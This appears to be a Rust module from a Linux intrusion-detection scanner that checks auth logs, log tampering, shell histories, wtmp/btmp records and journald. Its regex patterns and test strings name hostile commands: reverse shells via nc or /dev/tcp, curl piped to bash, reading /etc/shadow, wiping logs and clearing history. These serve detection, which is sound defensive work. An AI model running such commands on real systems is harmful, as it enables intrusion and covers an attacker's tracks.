use crate::config::ScanConfig;
use crate::report::{progress as prog, send, Finding, ScanEvent, Sender, Severity};
use crate::util::{self, Root};
use regex::RegexSet;
use std::collections::HashSet;
use std::time::{Duration, Instant};

const MODULE: &str = "LOGS";

fn progress(tx: &Sender, msg: &str) {
    prog(tx, MODULE, msg)
}

const LOG_CAP: usize = 64 * 1024 * 1024;

fn auth_log_analysis(cfg: &ScanConfig, tx: &Sender) {
    progress(tx, "Analyzing authentication logs...");
    let mut any = false;
    for log_path in ["/var/log/auth.log", "/var/log/secure"] {
        let content = match util::read_string_capped(log_path, LOG_CAP) {
            Some(c) => c,
            None => continue,
        };
        any = true;
        let failed: Vec<&str> =
            content.lines().filter(|l| l.contains("Failed password") || l.contains("authentication failure") || l.contains("Invalid user")).collect();
        if failed.len() > 50 {
            let mut ips: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
            for line in &failed {
                if let Some(i) = line.find(" from ") {
                    if let Some(ip) = line[i + 6..].split_whitespace().next() {
                        *ips.entry(ip.to_string()).or_default() += 1;
                    }
                }
            }
            let mut top: Vec<(String, usize)> = ips.into_iter().collect();
            top.sort_by_key(|x| std::cmp::Reverse(x.1));
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Brute Force", &format!("{} failed logins from {} source(s) in {}", failed.len(), top.len(), log_path))
                    .with_detail(&top.iter().take(10).map(|(ip, n)| format!("{} ×{}", ip, n)).collect::<Vec<_>>().join("\n"))
                    .subject(&format!("brute:{}", log_path)),
            );
            // a success from an IP that was brute-forcing = likely compromise
            let brute_ips: HashSet<&str> = top.iter().filter(|(_, n)| *n >= 10).map(|(ip, _)| ip.as_str()).collect();
            for line in content.lines().filter(|l| l.contains("Accepted ")) {
                if let Some(i) = line.find(" from ") {
                    if let Some(ip) = line[i + 6..].split_whitespace().next() {
                        if brute_ips.contains(ip) {
                            send(
                                tx,
                                Finding::new(Severity::Danger, MODULE, "Brute Force", &format!("Successful login from brute-forcing IP {}", ip))
                                    .with_detail(line)
                                    .subject(&format!("brute-success:{}", ip)),
                            );
                        }
                    }
                }
            }
        }
        let root_logins: Vec<&str> = content.lines().filter(|l| l.contains("Accepted ") && l.contains(" for root ")).collect();
        if !root_logins.is_empty() {
            send(
                tx,
                Finding::new(Severity::Info, MODULE, "Root Login", &format!("{} successful SSH root login(s) in {}", root_logins.len(), log_path))
                    .with_detail(root_logins.last().copied().unwrap_or_default())
                    .subject(&format!("rootlogin:{}", log_path)),
            );
        }
        let notable =
            RegexSet::new([r"(?i)COMMAND=.*(/bin/(ba)?sh\b|chmod\s+(777|[ug]\+s)|useradd|usermod|/etc/shadow|visudo|insmod|modprobe)"]).expect("regex");
        let n = content.lines().filter(|l| l.contains("sudo") && notable.is_match(l)).count();
        if n > 0 {
            send(
                tx,
                Finding::new(Severity::Info, MODULE, "Sudo", &format!("{} notable sudo commands (shell, chmod +s, useradd, insmod...) in {}", n, log_path))
                    .subject(&format!("sudo:{}", log_path)),
            );
        }
        break;
    }
    if !any && !cfg.is_root {
        send(tx, Finding::new(Severity::Info, MODULE, "Auth Log", "Auth logs need root to read").subject("authlog"));
    }
}

/// Parse a syslog timestamp ("Nov 22 14:30:01" or RFC3339) into a sortable value.
/// Timestamps are compared numerically so month and year rollovers are not mistaken for tampering.
pub fn parse_ts(line: &str) -> Option<i64> {
    if line.len() >= 19 && line.as_bytes()[4] == b'-' && line.as_bytes()[10] == b'T' {
        let dt = chrono::NaiveDateTime::parse_from_str(&line[..19], "%Y-%m-%dT%H:%M:%S").ok()?;
        return Some(dt.and_utc().timestamp());
    }
    if line.len() < 15 {
        return None;
    }
    let months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
    let mon = months.iter().position(|m| *m == &line[..3])? as i64;
    let day: i64 = line[4..6].trim().parse().ok()?;
    let t = &line[7..15];
    let h: i64 = t[0..2].parse().ok()?;
    let mi: i64 = t[3..5].parse().ok()?;
    let s: i64 = t[6..8].parse().ok()?;
    Some((((mon * 31 + day) * 24 + h) * 60 + mi) * 60 + s)
}

/// Count backward jumps > 5 min, ignoring year rollover (Dec → Jan).
pub fn backward_jumps(lines: &[&str]) -> Vec<String> {
    let mut gaps = Vec::new();
    let mut prev: Option<(i64, &str)> = None;
    for line in lines {
        if let Some(ts) = parse_ts(line) {
            if let Some((p, pl)) = prev {
                let year_rollover = pl.starts_with("Dec") && line.starts_with("Jan");
                if ts + 300 < p && !year_rollover {
                    gaps.push(format!("{} -> {}", util::truncate(pl, 15), util::truncate(line, 15)));
                }
            }
            prev = Some((ts, line));
        }
    }
    gaps
}

fn log_gap_detection(tx: &Sender) {
    progress(tx, "Checking logs for time travel and truncation...");
    for log_path in ["/var/log/syslog", "/var/log/auth.log", "/var/log/kern.log", "/var/log/messages", "/var/log/secure"] {
        let content = match util::read_string_capped(log_path, LOG_CAP) {
            Some(c) => c,
            None => continue,
        };
        let lines: Vec<&str> = content.lines().collect();
        if lines.len() < 10 {
            continue;
        }
        let gaps = backward_jumps(&lines);
        if !gaps.is_empty() {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Log Gap", &format!("{} backwards timestamp jump(s) > 5 min in {}", gaps.len(), log_path))
                    .with_detail(&format!("First: {}\nEntries may have been edited or spliced", gaps[0]))
                    .subject(&format!("gap:{}", log_path)),
            );
        }
    }
    for log_path in ["/var/log/auth.log", "/var/log/secure", "/var/log/syslog", "/var/log/messages", "/var/log/wtmp"] {
        if let Some(meta) = Root::live().lstat(log_path) {
            if meta.is_file() && meta.len() == 0 {
                send(
                    tx,
                    Finding::new(Severity::Warning, MODULE, "Truncated Log", &format!("{} is empty — wiped, or rotated moments ago", log_path))
                        .subject(&format!("empty:{}", log_path)),
                );
            }
        }
    }
}

pub fn history_patterns() -> RegexSet {
    RegexSet::new([
        r"(?i)\bhistory\s+-c\b",
        r"(?i)\bunset\s+HISTFILE\b",
        r"(?i)\bexport\s+HISTFILE(SIZE)?=(0|/dev/null)",
        r"(?i)\bexport\s+HISTSIZE=0\b",
        r"(?i)\bset\s+\+o\s+history\b",
        r"(?i)\bshred\b.*(/var/log|history)",
        r"(?i)\brm\s+-rf?\s+/var/log",
        r"(?i)>\s*/var/log/",
        r"(?i)\bcat\s+/etc/shadow\b",
        r"(?i)\b(nc|ncat)\b.*\s-e\s",
        r"(?i)/dev/tcp/",
        r"(?i)base64\s+(-d|--decode)",
        r"(?i)\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b",
        r"(?i)\binsmod\b|\bmodprobe\b.*\.ko",
        r"(?i)chattr\s+\+i",
        r"(?i)\bchmod\s+(u\+s|[46][0-7]{3})\b",
    ])
    .expect("regex")
}

fn history_analysis(tx: &Sender) {
    progress(tx, "Analyzing shell history of every user...");
    let root = Root::live();
    let patterns = history_patterns();
    for (user, home) in util::interesting_homes(&root) {
        for (file, shell) in [
            (".bash_history", "bash"),
            (".zsh_history", "zsh"),
            (".ash_history", "ash"),
            (".python_history", "python"),
            (".mysql_history", "mysql"),
            (".psql_history", "psql"),
        ] {
            let path = format!("{}/{}", home, file);
            if let Some(target) = root.readlink(&path) {
                if target.contains("/dev/null") {
                    send(
                        tx,
                        Finding::new(Severity::Danger, MODULE, "History Evasion", &format!("{}'s {} history is a symlink to /dev/null", user, shell))
                            .with_detail(&format!("{} -> {}", path, target))
                            .subject(&path),
                    );
                    continue;
                }
            }
            let content = match util::read_string_capped(&path, 16 * 1024 * 1024) {
                Some(c) => c,
                None => continue,
            };
            let mut hits = 0;
            for line in content.lines() {
                // zsh extended history: ": 1700000000:0;command"
                let cmd = line.split_once(';').filter(|_| line.starts_with(": ")).map(|(_, c)| c).unwrap_or(line);
                let m: Vec<usize> = patterns.matches(cmd).into_iter().collect();
                if !m.is_empty() {
                    hits += 1;
                    if hits <= 25 {
                        send(
                            tx,
                            Finding::new(
                                Severity::Warning,
                                MODULE,
                                "Suspicious Cmd",
                                &format!("{} {} history: {}", user, shell, util::truncate(cmd.trim(), 100)),
                            )
                            .with_detail(&format!("File: {}", path))
                            .subject(&format!("{}:{}", path, util::truncate(cmd.trim(), 60))),
                        );
                    }
                }
            }
        }
    }
}

/// glibc struct utmp on 64-bit Linux is 384 bytes.
pub fn parse_utmp(data: &[u8]) -> Vec<(i16, String, String, i64)> {
    let mut out = Vec::new();
    for rec in data.chunks_exact(384) {
        let ty = i16::from_ne_bytes([rec[0], rec[1]]);
        let cstr = |b: &[u8]| {
            let end = b.iter().position(|&c| c == 0).unwrap_or(b.len());
            String::from_utf8_lossy(&b[..end]).into_owned()
        };
        let user = cstr(&rec[44..76]);
        let host = cstr(&rec[76..332]);
        let sec = i32::from_ne_bytes([rec[340], rec[341], rec[342], rec[343]]) as i64;
        out.push((ty, user, host, sec));
    }
    out
}

fn wtmp_btmp_analysis(tx: &Sender) {
    progress(tx, "Parsing wtmp/btmp login records natively...");
    if let Some(data) = util::read_capped("/var/log/wtmp", 256 * 1024 * 1024) {
        if data.len() % 384 != 0 {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Log Wiped", "wtmp size is not a multiple of the record size — records were cut or edited")
                    .subject("wtmp-size"),
            );
        }
        let recs = parse_utmp(&data);
        let logins: Vec<_> = recs.iter().filter(|r| r.0 == 7).collect(); // USER_PROCESS
        let zeroed = data.chunks_exact(384).filter(|c| c.iter().all(|&b| b == 0)).count();
        if zeroed > 0 {
            send(
                tx,
                Finding::new(
                    Severity::Warning,
                    MODULE,
                    "Log Wiped",
                    &format!("{} zeroed record(s) inside wtmp — classic log-cleaner (wtmpclean/zap) artefact", zeroed),
                )
                .subject("wtmp-zero"),
            );
        }
        let mut back = 0;
        for w in logins.windows(2) {
            if w[1].3 + 300 < w[0].3 {
                back += 1;
            }
        }
        if back > 0 {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Log Gap", &format!("{} backwards time jump(s) between wtmp login records", back)).subject("wtmp-gap"),
            );
        }
        send(tx, Finding::new(Severity::Info, MODULE, "Login Records", &format!("{} login records in wtmp", logins.len())).subject("wtmp"));
    }
    if let Some(data) = util::read_capped("/var/log/btmp", 256 * 1024 * 1024) {
        let n = parse_utmp(&data).len();
        if n > 100 {
            send(tx, Finding::new(Severity::Warning, MODULE, "Failed Logins", &format!("{} failed login records in btmp", n)).subject("btmp"));
        }
    }
}

fn journald_analysis(tx: &Sender) {
    progress(tx, "Checking journald for crashes and tampering...");
    let journalctl = ["/usr/bin/journalctl", "/bin/journalctl"];
    if let Some(out) = util::run_cmd(
        &journalctl,
        &["--since", "7 days ago", "--no-pager", "-q", "-o", "short", "--grep", "segfault|general protection|exploit|stack smashing"],
        Duration::from_secs(30),
        8 * 1024 * 1024,
        None,
    ) {
        let n = out.stdout_str().lines().count();
        if n > 0 {
            send(
                tx,
                Finding::new(Severity::Info, MODULE, "Segfaults", &format!("{} crash/exploit-like events in the journal (7 days)", n)).subject("journal-crash"),
            );
        }
    }
    if let Some(out) = util::run_cmd(&journalctl, &["--verify", "-q"], Duration::from_secs(60), 1024 * 1024, None) {
        let err = out.stderr_str();
        let bad: Vec<&str> = err.lines().filter(|l| l.contains("FAIL")).collect();
        if !bad.is_empty() {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Log Wiped", &format!("journalctl --verify reports {} corrupted/tampered journal file(s)", bad.len()))
                    .with_detail(&format!(
                        "{}\nCan also follow an unclean shutdown — compare with reboot times",
                        bad.iter().take(5).copied().collect::<Vec<_>>().join("\n")
                    ))
                    .subject("journal-verify"),
            );
        }
    }
    if let Some(out) = util::run_cmd(
        &["/usr/bin/systemctl", "/bin/systemctl"],
        &["--failed", "--no-legend", "--no-pager", "--plain"],
        Duration::from_secs(15),
        1024 * 1024,
        None,
    ) {
        let s = out.stdout_str();
        let failed: Vec<&str> = s.lines().filter(|l| !l.trim().is_empty()).collect();
        if !failed.is_empty() {
            send(
                tx,
                Finding::new(Severity::Info, MODULE, "Failed Services", &format!("{} failed systemd unit(s)", failed.len()))
                    .with_detail(&failed.iter().take(5).copied().collect::<Vec<_>>().join("\n"))
                    .subject("failed-units"),
            );
        }
    }
}

pub fn scan(cfg: &ScanConfig, tx: Sender) {
    let start = Instant::now();
    let _ = tx.send(ScanEvent::ModuleStart(MODULE.to_string()));
    auth_log_analysis(cfg, &tx);
    log_gap_detection(&tx);
    history_analysis(&tx);
    wtmp_btmp_analysis(&tx);
    journald_analysis(&tx);
    let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn month_rollover_is_not_tampering() {
        let lines = ["Nov 30 23:59:01 h a", "Dec  1 00:00:05 h b", "Dec 31 23:59:59 h c", "Jan  1 00:00:01 h d"];
        assert!(backward_jumps(&lines).is_empty());
        let tampered = ["Nov 22 14:30:01 h a", "Nov 22 09:00:00 h b"];
        assert_eq!(backward_jumps(&tampered).len(), 1);
        let iso = ["2026-11-22T14:30:01.123+05:30 h a", "2026-11-22T10:00:00.000+05:30 h b"];
        assert_eq!(backward_jumps(&iso).len(), 1);
    }

    #[test]
    fn history_patterns_case_insensitive() {
        let p = history_patterns();
        for bad in ["unset HISTFILE", "export HISTSIZE=0", "curl -s http://x/a.sh | bash", "chmod u+s /tmp/.x", "insmod rk.ko", "history -c"] {
            assert!(p.is_match(bad), "{}", bad);
        }
        for good in ["ls -la", "git commit -m 'history cleanup'", "curl -O https://x/file.tar.gz"] {
            assert!(!p.is_match(good), "{}", good);
        }
    }

    #[test]
    fn utmp_parsing() {
        let mut rec = vec![0u8; 384];
        rec[0..2].copy_from_slice(&7i16.to_ne_bytes());
        rec[44..48].copy_from_slice(b"kush");
        rec[76..85].copy_from_slice(b"10.0.0.99");
        rec[340..344].copy_from_slice(&1_700_000_000i32.to_ne_bytes());
        let v = parse_utmp(&rec);
        assert_eq!(v[0], (7, "kush".to_string(), "10.0.0.99".to_string(), 1_700_000_000));
    }
}
